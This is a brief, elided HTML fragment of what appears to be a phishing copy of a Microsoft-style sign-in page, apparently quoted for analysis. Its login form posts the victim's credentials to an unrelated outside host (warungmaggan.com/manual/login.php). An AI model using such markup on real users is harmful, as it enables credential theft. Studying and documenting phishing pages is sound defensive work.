...
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-gr-c-s-loaded="true">
    ...
    <div>
        ...
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="https://warungmaggan.com/manual/login.php" onsubmit="return checkSubmit()">
